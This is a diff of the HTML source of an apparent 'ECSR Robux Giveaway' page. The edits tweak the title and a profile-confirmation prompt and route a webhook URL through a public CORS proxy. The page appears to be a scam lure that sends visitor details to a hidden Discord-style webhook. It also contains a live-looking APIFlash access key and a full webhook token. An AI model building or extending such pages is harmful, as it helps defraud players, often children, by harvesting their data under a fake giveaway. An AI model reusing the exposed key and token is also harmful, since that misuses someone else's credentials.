@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>ECSR Robux Giveaway - Neon Edition</title>
+<title>ECSR Robux Giveaway</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
 
@@ -124,7 +124,7 @@
 </div>
 
 <div id="step3" class="hidden center">
-  <p>Is this your profile?</p>
+  <p>Is this your profile? it takes while to load</p>
   <img id="profileImg" src="" alt="ECSR Profile Screenshot" />
   <button id="confirmProfileBtn" type="button">Yes, that's me!</button>
 </div>
@@ -153,7 +153,8 @@
 
 <script>
   const accessKey = '91aeaa0c407e4f089e1c49af78437242'; // APIFlash key
-  const webhookURL = 'https://webhook.lewisakura.moe/api/webhooks/1375801999031009481/vd7Jp0aByQintEklFwy2tQurKJFdGPF9uIKczMqwTbEOV70avbjTXKdEpK2YViaiXD8r';
+ const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+const webhookURL = proxyUrl + 'https://webhook.lewisakura.moe/api/webhooks/1375801999031009481/vd7Jp0aByQintEklFwy2tQurKJFdGPF9uIKczMqwTbEOV70avbjTXKdEpK2YViaiXD8r';
 
   const step1 = document.getElementById('step1');
   const step2 = document.getElementById('step2');
